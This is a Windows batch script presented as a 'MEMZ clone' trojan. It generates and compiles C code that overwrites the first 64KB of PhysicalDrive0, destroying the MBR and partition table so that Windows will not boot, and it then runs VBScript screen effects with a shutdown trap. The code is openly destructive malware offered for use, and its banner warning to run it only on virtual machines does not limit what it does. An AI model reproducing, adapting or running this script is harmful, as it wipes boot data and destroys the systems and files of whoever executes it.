@echo off
title Crazyware - MEMZ Clone (NO PYTHON)
color 0c
mode con cols=75 lines=20

echo ==================================================
echo ⚠️  WARNING: ACTS LIKE ORIGINAL MEMZ TROJAN
echo ==================================================
echo Overwrites first 64KB of hard drive, damages MBR
echo & partition table. Windows WILL NOT boot normally.
echo USE ONLY ON VIRTUAL MACHINES / TEST DEVICES!
echo ==================================================
echo Press any key to continue...
pause >nul

:: Check Admin
net session >nul 2>&1 || (echo ERROR: Run as ADMINISTRATOR & pause & exit /b)

:: ==============================================
:: PART 1: OVERWRITE MBR (NO PYTHON)
:: ==============================================
echo [1/2] Preparing boot sector...
(
echo #include <windows.h>
echo int main() {
echo     HANDLE h = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE,
echo         FILE_SHARE_READ ^| FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
echo     if (h == INVALID_HANDLE_VALUE) return 1;
echo     // YOUR PC HAS BEEN TRASHED BY BADICHA TROJAN
echo     unsigned char mbr[512] = {
echo         0x59,0x4F,0x55,0x52,0x20,0x50,0x43,0x20,
echo         0x48,0x41,0x53,0x20,0x42,0x45,0x45,0x4E,
echo         0x20,0x54,0x52,0x41,0x53,0x48,0x45,0x44,
echo         0x20,0x42,0x59,0x20,0x42,0x41,0x44,0x49,
echo         0x43,0x48,0x41,0x20,0x54,0x52,0x4F,0x4A,0x41,0x4E,0x00
echo     };
echo     memset(mbr + 46, 0, 510 - 46);
echo     mbr[510] = 0x55; mbr[511] = 0xAA;
echo     DWORD w;
echo     for(int i=0; i<128; i++){ // 128 sectors = 64KB
echo         SetFilePointer(h, i*512, NULL, FILE_BEGIN);
echo         WriteFile(h, mbr, 512, &w, NULL);
echo     }
echo     CloseHandle(h);
echo     return 0;
echo }
) > mbr.c

:: Compile pakai MSVC (bawaan Windows SDK / Build Tools)
call "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" 2>nul || (
  call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" 2>nul
)
cl /nologo mbr.c kernel32.lib user32.lib >nul 2>&1
if exist mbr.exe mbr.exe
del mbr.* >nul 2>&1

:: ==============================================
:: PART 2: GDI EFFECTS + SHUTDOWN TRAP (VBS)
:: ==============================================
echo [2/2] Running screen effects...
(
echo Set WshShell = CreateObject("WScript.Shell")
echo Set Win = CreateObject("WScript.Shell").Environment("Process")
echo Dim obj, hdc, w, h, x, y, sz
echo Set api = GetObject("winmgmts:").InstancesOf("Win32_PerfFormattedData_Counters_ProcessorInformation")
echo.
echo ' Trap: if closed, shutdown
echo Sub OnQuit
echo     WshShell.Run "shutdown /s /f /t 1", 0, False
echo End Sub
echo.
echo ' Get screen size
echo Set scr = CreateObject("WScript.Shell").SpecialFolders("Desktop")
echo Set html = CreateObject("HTMLFile")
echo w = html.parentWindow.screen.width
echo h = html.parentWindow.screen.height
echo.
echo ' Flip + Melt + Stretch effects
echo Set gdi = CreateObject("WScript.Shell")
echo For t = 1 To 350
echo     If t < 90 Then
echo         WshShell.Run "mshta ""<script>new ActiveXObject('WScript.Shell').SendKeys('{SCROLLLOCK}');</script>""",0,True
echo     ElseIf t < 250 Then
echo         For sz = 0 To 180 Step 25
echo             WshShell.Run "mshta ""<script>resizeTo(" & w-sz*2 & "," & h-sz*2 & ");moveTo(" & sz & "," & sz & ");</script>""",0,True
echo         Next
echo     Else
echo         WshShell.Run "mshta ""<script>moveBy(0,10);</script>""",0,True
echo     End If
echo     WScript.Sleep 50
echo Next
echo.
echo ' Cancel trap if done
echo Set WshShell = Nothing
) > effects.vbs

cscript //nologo effects.vbs
del effects.vbs >nul

echo.
echo ==================================================
echo DONE.
echo ON RESTART: "YOUR PC HAS BEEN TRASHED BY BADICHA TROJAN"
echo WINDOWS WILL NOT BOOT.
echo ==================================================
pause
exit /b